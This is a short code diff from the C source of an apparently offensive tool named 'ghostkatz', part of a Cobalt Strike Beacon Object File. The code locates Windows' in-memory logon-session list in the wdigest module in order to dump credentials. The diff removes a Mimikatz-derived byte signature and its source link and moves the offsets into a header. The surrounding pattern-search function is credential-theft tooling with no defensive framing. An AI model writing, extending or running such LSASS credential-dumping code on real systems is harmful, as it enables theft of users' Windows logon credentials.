@@ -3,10 +3,7 @@
 
 #include "ghostkatz.h"
 #include "defs.h"
-
-// Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz) - works on windows 10
-// https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c#L14C6-L14C25
-unsigned char logSessListSig[] = { 0x48, 0x3b, 0xd9, 0x74 };
+#include "lsass_offsets.h"
 
 DWORD64 SearchForLogSessList(void)
 {
@@ -23,7 +20,7 @@ DWORD64 SearchForLogSessList(void)
         BeaconFormatPrintf(&outputbuffer, "[!] Could not find l_LogSessList pattern signature\n");
         return -1;
     }
-
+    
     // Get the full address where the mimikatz byte pattern was found
     PBYTE logSessList_PatternAddress = wdigestTextBase + logSessListSig_PatternOffset;
 
